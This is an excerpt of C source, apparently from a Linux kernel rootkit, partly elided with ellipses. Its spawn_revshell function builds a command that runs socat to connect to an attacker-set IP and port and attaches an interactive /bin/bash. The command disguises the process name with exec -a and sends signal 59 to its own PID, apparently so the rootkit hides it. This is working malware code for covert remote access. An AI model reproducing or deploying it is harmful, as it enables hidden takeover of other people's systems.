...
#define IP_OFFSET   0x1FFF   // Fragment offset field mask
...
notrace static void spawn_revshell(struct work_struct *work)
{
   ...
   snprintf(cmd, sizeof(cmd),
             ...
             "' 2>/dev/null &", PROC_NAME, YOUR_SRV_IP, SRV_PORT);
      } else {
         snprintf(cmd, sizeof(cmd),
                         "PID=$$;"
                         "kill -59 $PID;"
                         "exec -a %s /usr/bin/socat TCP:%s:%s EXEC:/bin/bash,pty,stderr,setsid,sigint,sane",
                         PROC_NAME,ip_buf, SRV_PORT);
